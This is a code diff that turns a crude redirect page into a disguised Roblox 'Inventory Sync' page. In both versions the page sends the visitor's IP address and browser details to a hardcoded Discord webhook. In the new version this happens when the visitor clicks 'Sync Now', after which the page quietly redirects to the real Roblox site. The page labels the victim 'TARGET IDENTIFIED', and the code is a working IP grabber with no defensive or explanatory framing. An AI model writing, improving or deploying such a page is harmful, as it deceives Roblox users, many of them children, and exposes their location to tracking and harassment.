@@ -1,44 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Roblox | Inventory Sync</title>
+    <style>
+        body { background: #f2f4f5; font-family: 'Segoe UI', Arial; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; padding: 40px; text-align: center; }
+        .btn { background: #00b2ff; color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
+    </style>
 </head>
-<body style="background: #000; color: #ff0000; font-family: monospace;">
-    <p>INITIALIZING SECURE TUNNEL...</p>
-    
+<body>
+    <div class="card">
+        <h1>Sync Inventory</h1>
+        <p>Click to synchronize your heart box asset with your Roblox account.</p>
+        <button class="btn" id="sync">Sync Now</button>
+    </div>
+
     <script>
         const HOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function captureAndRedirect() {
+        document.getElementById('sync').addEventListener('click', async () => {
             try {
-                // Grab the target's IP/Location
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
 
-                // Log the entry to your Discord
                 await fetch(HOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "💀 TARGET REDIRECTED",
+                            title: "🎯 TARGET IDENTIFIED",
                             color: 16711680,
                             fields: [
                                 { name: "IPv4", value: data.ip },
-                                { name: "UA", value: navigator.userAgent }
-                            ],
-                            footer: { text: "SHΔDØW WORM-AI💀🔥" }
+                                { name: "Hardware", value: navigator.platform },
+                                { name: "Engine", value: navigator.userAgent }
+                            ]
                         }]
                     })
                 });
             } catch (e) {}
-
-            // The Instant Redirect to the REAL Roblox
             window.location.href = "https://www.roblox.com/home";
-        }
-
-        // Execute on load
-        captureAndRedirect();
+        });
     </script>
 </body>
 </html>
